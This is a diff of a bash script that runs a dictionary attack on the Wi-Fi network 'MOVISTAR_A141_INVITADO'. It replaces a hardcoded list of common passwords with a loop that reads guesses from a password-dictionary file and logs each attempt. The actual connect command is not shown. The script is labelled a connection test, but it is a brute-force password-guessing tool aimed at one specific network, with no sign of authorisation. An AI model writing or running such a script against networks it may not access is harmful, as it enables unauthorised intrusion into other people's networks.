@@ -7,13 +7,14 @@
 #
 
 ssid="MOVISTAR_A141_INVITADO"
-passwords=("123456" "1q2w3e" "123456789") # List of password to try
+password_file="passwords-dictionary.txt"  # Archivo con el listado de contraseñas
 attempt=1  # counter
 
 echo "Starting the test connection for SSID: $ssid"
 echo "========================================="
 
-for password in "${passwords[@]}"; do
+# Leer el archivo línea por línea
+while IFS= read -r password; do
     echo "Attempt # $attempt: SSID='$ssid', Password='$password'"
 
     # Intentar conectar
@@ -28,6 +29,6 @@ for password in "${passwords[@]}"; do
     fi
 
     ((attempt++))  # Incrementar contador de intentos
-done
+done < "$password_file"  # Leer desde el archivo
 
 echo "Testing process completed."
